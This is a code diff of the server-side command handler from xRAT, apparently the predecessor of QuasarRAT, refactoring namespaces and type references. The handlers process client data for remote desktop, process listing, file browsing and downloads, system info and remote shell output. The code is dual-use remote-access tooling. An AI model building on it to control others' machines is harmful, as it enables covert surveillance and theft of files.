@@ -2,14 +2,16 @@
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
-using xRAT_2.Forms;
-using xRAT_2.Settings;
+using xServer.Core.Misc;
+using xServer.Core.Packets.ClientPackets;
+using xServer.Forms;
+using xServer.Settings;
 
-namespace Core.Commands
+namespace xServer.Core.Commands
 {
 	public class CommandHandler
 	{
-		public static void HandleInitialize(Client client, Core.Packets.ClientPackets.Initialize packet, frmMain mainForm)
+		public static void HandleInitialize(Client client, Initialize packet, frmMain mainForm)
 		{
 			if (client.EndPoint.Address.ToString() == "255.255.255.255")
 				return;
@@ -57,7 +59,7 @@ namespace Core.Commands
 			mainForm.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
 		}
 
-		public static void HandleStatus(Client client, Core.Packets.ClientPackets.Status packet, frmMain mainForm)
+		public static void HandleStatus(Client client, Status packet, frmMain mainForm)
 		{
 			new Thread(new ThreadStart(() =>
 			{
@@ -77,7 +79,7 @@ namespace Core.Commands
 			})).Start();
 		}
 
-		public static void HandleUserStatus(Client client, Core.Packets.ClientPackets.UserStatus packet, frmMain mainForm)
+		public static void HandleUserStatus(Client client, UserStatus packet, frmMain mainForm)
 		{
 			new Thread(new ThreadStart(() =>
 			{
@@ -97,14 +99,14 @@ namespace Core.Commands
 			})).Start();
 		}
 
-		public static void HandleRemoteDesktopResponse(Client client, Core.Packets.ClientPackets.DesktopResponse packet)
+		public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
 		{
 			if (client.Value.frmRDP == null)
 				return;
 
 			if (client.Value.lastDesktop == null)
 			{
-				Bitmap newScreen = (Bitmap)Helper.CByteToImg(packet.Image);
+				Bitmap newScreen = (Bitmap)Helper.Helper.CByteToImg(packet.Image);
 				client.Value.lastDesktop = newScreen;
 				client.Value.frmRDP.Invoke((MethodInvoker)delegate
 				{
@@ -114,7 +116,7 @@ namespace Core.Commands
 			}
 			else
 			{
-				Bitmap screen = (Bitmap)Helper.CByteToImg(packet.Image);
+				Bitmap screen = (Bitmap)Helper.Helper.CByteToImg(packet.Image);
 
 				Bitmap newScreen = new Bitmap(screen.Width, screen.Height);
 
@@ -137,7 +139,7 @@ namespace Core.Commands
 			client.Value.lastDesktopSeen = true;
 		}
 
-		public static void HandleGetProcessesResponse(Client client, Core.Packets.ClientPackets.GetProcessesResponse packet)
+		public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
 		{
 			if (client.Value.frmTM == null)
 				return;
@@ -168,7 +170,7 @@ namespace Core.Commands
 			})).Start();
 		}
 
-		public static void HandleDrivesResponse(Client client, Core.Packets.ClientPackets.DrivesResponse packet)
+		public static void HandleDrivesResponse(Client client, DrivesResponse packet)
 		{
 			if (client.Value.frmFM == null)
 				return;
@@ -181,7 +183,7 @@ namespace Core.Commands
 			});
 		}
 
-		public static void HandleDirectoryResponse(Client client, Core.Packets.ClientPackets.DirectoryResponse packet)
+		public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
 		{
 			if (client.Value.frmFM == null)
 				return;
@@ -231,10 +233,10 @@ namespace Core.Commands
 					{
 						if (packet.Files[i] != "$$$EMPTY$$$$")
 						{
-							ListViewItem lvi = new ListViewItem(new string[] { packet.Files[i], Helper.GetFileSize(packet.FilesSize[i]), "File" });
+							ListViewItem lvi = new ListViewItem(new string[] { packet.Files[i], Helper.Helper.GetFileSize(packet.FilesSize[i]), "File" });
 							lvi.Tag = "file";
 
-							lvi.ImageIndex = Helper.GetFileIcon(System.IO.Path.GetExtension(packet.Files[i]));
+							lvi.ImageIndex = Helper.Helper.GetFileIcon(System.IO.Path.GetExtension(packet.Files[i]));
 
 							try
 							{
@@ -253,7 +255,7 @@ namespace Core.Commands
 			})).Start();
 		}
 
-		public static void HandleDownloadFileResponse(Client client, Core.Packets.ClientPackets.DownloadFileResponse packet)
+		public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
 		{
 			string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
 			if (!Directory.Exists(downloadPath))
@@ -324,7 +326,7 @@ namespace Core.Commands
 			}
 		}
 
-		public static void HandleGetSystemInfoResponse(Client client, Core.Packets.ClientPackets.GetSystemInfoResponse packet)
+		public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
 		{
 			if (client.Value.frmSI == null)
 				return;
@@ -361,7 +363,7 @@ namespace Core.Commands
 			{ }
 		}
 
-		public static void HandleMonitorsResponse(Client client, Core.Packets.ClientPackets.MonitorsResponse packet)
+		public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
 		{
 			if (client.Value.frmRDP == null)
 				return;
@@ -379,7 +381,7 @@ namespace Core.Commands
 			{ }
 		}
 
-		public static void HandleShellCommandResponse(Client client, Core.Packets.ClientPackets.ShellCommandResponse packet)
+		public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
 		{
 			if (client.Value.frmRS == null)
 				return;
